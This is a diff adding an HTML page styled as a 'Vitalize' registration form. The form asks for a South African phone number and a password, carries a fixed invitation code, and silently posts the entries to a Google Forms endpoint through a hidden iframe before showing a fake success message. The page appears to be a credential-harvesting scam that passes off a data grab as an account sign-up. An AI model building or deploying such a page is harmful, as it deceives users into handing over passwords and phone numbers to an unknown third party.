@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vitalize - Register</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #141E30, #243B55);
+      background-attachment: fixed;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.05) 1%, transparent 1%) repeat;
+      background-size: 40px 40px;
+      animation: moveBg 20s linear infinite;
+    }
+
+    @keyframes moveBg {
+      0% { transform: translate(0,0); }
+      100% { transform: translate(40px,40px); }
+    }
+
+    .register-box {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      padding: 35px;
+      width: 350px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+      animation: fadeInUp 1s ease-out;
+    }
+
+    @keyframes fadeInUp {
+      0% { opacity: 0; transform: translateY(50px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+      width: 90px;
+      margin-bottom: 15px;
+    }
+
+    .register-box h2 {
+      margin-bottom: 25px;
+      color: #243B55;
+      font-size: 22px;
+      letter-spacing: 1px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      border-color: #243B55;
+      box-shadow: 0 0 8px rgba(36, 59, 85, 0.3);
+      outline: none;
+    }
+
+    input[readonly] {
+      background: #f0f0f0;
+      font-weight: bold;
+      color: #555;
+      cursor: not-allowed;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #243B55, #141E30);
+      color: #fff;
+      padding: 14px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+      font-weight: bold;
+    }
+
+    .btn:hover {
+      background: linear-gradient(135deg, #141E30, #243B55);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+    }
+
+    .login-link {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .login-link a {
+      color: #243B55;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .login-link a:hover {
+      text-decoration: underline;
+    }
+
+    #successMsg {
+      display: none;
+      color: green;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="register-box">
+    <img src="https://i.ibb.co/d04cQjGh/v-logo-260nw-727645264.webp" alt="Vitalize Logo" class="logo">
+    <h2>Vitalize Registration</h2>
+
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse" 
+          method="POST" 
+          target="hidden_iframe" 
+          onsubmit="submitted=true;">
+
+      <div class="form-group">
+        <label for="countryCode">Country Code</label>
+        <input type="text" id="countryCode" value="+27" readonly>
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="entry.11026931" placeholder="Enter phone number" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="entry.70675987" placeholder="Enter password" required>
+      </div>
+
+      <div class="form-group">
+        <label for="confirmPassword">Confirm Password</label>
+        <input type="password" id="confirmPassword" name="entry.2139866834" placeholder="Confirm password" required>
+      </div>
+
+      <div class="form-group">
+        <label for="invite">Invitation Code</label>
+        <input type="text" id="invite" name="entry.1944770665" value="25114" readonly>
+      </div>
+
+      <button type="submit" class="btn">Register</button>
+    </form>
+
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    <p id="successMsg">✅ Registration successful!</p>
+
+    <div class="login-link">
+      Already have an account? <a href="#">Login</a>
+    </div>
+  </div>
+
+  <script>
+    let submitted = false;
+    document.querySelector("form").addEventListener("submit", function(){
+      setTimeout(() => {
+        if (submitted) {
+          document.getElementById("successMsg").style.display = "block";
+        }
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
